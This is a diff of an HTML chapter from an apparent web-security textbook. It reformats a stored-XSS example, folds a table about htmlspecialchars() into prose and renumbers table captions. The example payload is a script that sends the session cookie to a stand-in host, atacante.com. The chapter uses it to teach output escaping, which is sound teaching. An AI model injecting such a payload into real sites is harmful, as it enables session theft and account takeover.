@@ -495,42 +495,14 @@ Table&nbsp;9.1: The chapter topics and the OWASP Top 10:2025 categories.
 <span id="cb6-2"><a href="#cb6-2"></a><span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span> <span class="va">$_POST</span>[<span class="st">"comentario"</span>] <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
 <p>A normal comment, such as <code>Muito bom!</code>, appears as it was written. A comment with <code>&lt;b&gt;Muito bom!&lt;/b&gt;</code> appears in bold, because the <em>browser</em> interprets the tag. And a comment with a <code>&lt;script&gt;</code> shows nothing, but the code runs. The code inserted in the text has become part of the page, and the <em>browser</em> cannot tell the site’s code from the code inserted by the visitor.</p>
 <p>The attack unfolds in five steps. The attacker writes a malicious comment, for example:</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">=</span><span class="st">'http://atacante.com/roubo?c='</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb7-2"><a href="#cb7-2"></a>  <span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">=</span><span class="st">'http://atacante.com/roubo?c='</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span></span>
+<span id="cb7-3"><a href="#cb7-3"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
 <p>The Contraponto site stores and displays it. When an authenticated user, such as Rita, the site manager, opens the page, she receives it with the <code>&lt;script&gt;</code> inside, and the code runs in her <em>browser</em>. The <em>script</em> sends this site’s session <em>cookie</em> to the attacker, without Rita seeing anything, and the attacker uses that <em>cookie</em> to enter the site as Rita, with her privileges (<a href="cap07.html#sec-07-sessions-en" class="quarto-xref"><span>Section 7.9.2</span></a>). Note that the <em>script</em> can only read the <em>cookies</em> of the site itself: those of other sites, such as the bank, remain out of reach.</p>
 <p>The defence is to always escape the text coming from users before displaying it in HTML, with the <code>htmlspecialchars()</code> function. This function replaces the special HTML characters (<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> and quotes) with harmless entities, and the <em>browser</em> displays the text instead of executing it:</p>
 <div class="sourceCode" id="cb8"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1"></a><span class="kw">&lt;?php</span></span>
 <span id="cb8-2"><a href="#cb8-2"></a><span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span> <span class="fu">htmlspecialchars</span>(<span class="va">$_POST</span>[<span class="st">"comentario"</span>]) <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
-<div id="tbl-09-escape-en" class="quarto-float quarto-figure quarto-figure-center anchored">
-<figure class="quarto-float quarto-float-tbl figure">
-<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-escape-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Table&nbsp;9.2: The effect of <code>htmlspecialchars()</code>.
-</figcaption>
-<div aria-describedby="tbl-09-escape-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-<table class="caption-top table">
-<colgroup>
-<col style="width: 27%">
-<col style="width: 41%">
-<col style="width: 30%">
-</colgroup>
-<thead>
-<tr class="header">
-<th style="text-align: left;">What the attacker writes</th>
-<th style="text-align: left;">The generated HTML</th>
-<th style="text-align: left;">What the <em>browser</em> does</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: left;"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td style="text-align: left;"><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></td>
-<td style="text-align: left;">shows the text, does not execute it</td>
-</tr>
-</tbody>
-</table>
-</div>
-</figure>
-</div>
-<p>This way, the attacker’s text is shown literally on the page, as visible text, and is not interpreted as code. The rule is to always escape on output: all text coming from users, before displaying it in HTML.</p>
+<p>For example, the text <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> becomes <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>: the <em>browser</em> shows the text and does not execute it. This way, the attacker’s text is shown literally on the page, as visible text, and is not interpreted as code. The rule is to always escape on output: all text coming from users, before displaying it in HTML.</p>
 </section>
 <section id="sec-09-csrf-en" class="level3" data-number="9.3.3">
 <h3 data-number="9.3.3" class="anchored" data-anchor-id="sec-09-csrf-en"><span class="header-section-number">9.3.3</span> CSRF (Cross-Site Request Forgery)</h3>
@@ -578,7 +550,7 @@ Table&nbsp;9.2: The effect of <code>htmlspecialchars()</code>.
 <div id="tbl-09-plain-text-en" class="quarto-float quarto-figure quarto-figure-center anchored">
 <figure class="quarto-float quarto-float-tbl figure">
 <figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-plain-text-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Table&nbsp;9.3: The <code>utilizadores</code> table with plain-text passwords.
+Table&nbsp;9.2: The <code>utilizadores</code> table with plain-text passwords.
 </figcaption>
 <div aria-describedby="tbl-09-plain-text-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
 <table class="caption-top table">
@@ -713,7 +685,7 @@ $2y$12$JN664fXU3AqFVrjy2BYRruHKFpVmDZnHpk4rHlZTo5mSHGVvCrjnC</code></pre>
 <div id="tbl-09-contexts-en" class="quarto-float quarto-figure quarto-figure-center anchored">
 <figure class="quarto-float quarto-float-tbl figure">
 <figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-contexts-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Table&nbsp;9.4: Escaping according to context.
+Table&nbsp;9.3: Escaping according to context.
 </figcaption>
 <div aria-describedby="tbl-09-contexts-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
 <table class="caption-top table">
@@ -763,7 +735,7 @@ Table&nbsp;9.4: Escaping according to context.
 <div id="tbl-09-requirements-en" class="quarto-float quarto-figure quarto-figure-center anchored">
 <figure class="quarto-float quarto-float-tbl figure">
 <figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-requirements-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Table&nbsp;9.5: Rita’s requirements.
+Table&nbsp;9.4: Rita’s requirements.
 </figcaption>
 <div aria-describedby="tbl-09-requirements-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
 <table class="caption-top table">
@@ -895,7 +867,7 @@ Table&nbsp;9.5: Rita’s requirements.
 <div id="tbl-09-summary-en" class="quarto-float quarto-figure quarto-figure-center anchored">
 <figure class="quarto-float quarto-float-tbl figure">
 <figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-summary-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Table&nbsp;9.6: Six categories, nine defences.
+Table&nbsp;9.5: Six categories, nine defences.
 </figcaption>
 <div aria-describedby="tbl-09-summary-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
 <table class="caption-top table">
